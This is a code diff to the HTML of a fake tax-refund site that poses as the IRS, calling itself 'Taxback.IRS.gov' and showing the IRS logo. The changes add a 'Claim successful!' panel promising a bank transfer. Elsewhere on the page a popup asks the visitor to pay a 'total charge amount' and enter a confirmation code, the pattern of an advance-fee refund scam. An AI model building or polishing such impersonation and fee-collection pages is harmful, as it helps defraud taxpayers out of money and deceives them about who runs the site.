@@ -5,6 +5,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   
+  <link rel="shortcut icon" href="img/taxback-logo.png" type="image/x-icon" />
+  
   <link rel="stylesheet" href="icon/icon.css" type="text/css" media="all" />
   
   <link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
@@ -16,10 +18,11 @@
   <div class="landing active">
     <div class="header">
       <img src="img/taxback-logo.png" alt="taxback-logo">
+      
       <img style="border-radius: 0;" src="img/IRS-Logo.svg" alt="irs-logo">
     </div>
     
-    <div class="loader active">
+    <div class="loader">
       <span class="rotate ms-rounded">globe</span>
       <span class="message">Checking your information to see if you're eligible, please wait...</span>
     </div>
@@ -55,9 +58,9 @@
   </div>
   
   <header>
-    <img src="img/taxback-logo.png" alt="taxback.org logo">
+    <img src="img/taxback-logo.png" alt="taxback-logo">
     
-    <span class="sitename">IRS Tax returns</span>
+    <span class="sitename">Taxback.IRS.gov</span>
   </header>
   
   <main>
@@ -100,7 +103,19 @@
         </div>
       </div>
       
-      <div style="width: 100%;display: grid;grid-auto-flow: row;gap:15px;">
+      <div class="funds-transfer-progress">
+        <span class="title">
+          Claim successful! <span class="ms-rounded">celebration</span>
+        </span>
+        
+        <span class="content">
+          <b><span class="transfer-amt"></span></b> is on its way to your bank account and you will be credited as soon as we are done reviewing your credit records and tax compliance <br><br> Wire transfers should take not more than 2hrs, but in some cases might <br><br> Only click the button below if you have not been credited after 24hrs
+        </span>
+        
+        <button class="report-issue">Crediting issue</button>
+      </div>
+      
+      <div class="fund-details--title" style="width: 100%;grid-auto-flow: row;gap:15px;">
         <span style="font-size: 16px; font-weight: 400; font-family: 'msd', serif; text-transform: uppercase;letter-spacing: 1.5px;">Tax return details</span>
         
         <div class="fund-details">
@@ -113,7 +128,7 @@
       
       <div class="fund-agreement active">
         <div class="title">
-          <span>Tax return agreement</span>
+          <span style="font-family: 'msd', serif;">Tax return agreement</span>
         </div>
         
         <div class="content">
@@ -150,7 +165,7 @@
       </span>
       
       <span class="content">
-        You are to pay a total charge amount of <span class="popup-charge-amt">$0.00</span>
+        You are to pay a total charge amount of <b><span class="popup-charge-amt">$0.00</span></b>
       </span>
       
       <input type="text" class="confirm-payment" placeholder="Enter confirmation code">
@@ -164,7 +179,9 @@
       <div class="footer-banner">
         <img src="img/taxback-logo.png" alt="taxback-logo">
         
-        <span>IRS TAX RETURNS</span>
+        <img style="border-radius: 0;" src="img/IRS-Logo.svg" alt="irs-logo">
+        
+        <span>TAXBACK</span>
       </div>
       
       <div class="footer-links">
@@ -174,7 +191,7 @@
       </div>
       
       <div class="footer-attribution">
-        <span>IRS Tax returns © 2025</span>
+        <span>Taxback.IRS.gov © 2025</span>
       </div>
     </div>
   </footer>
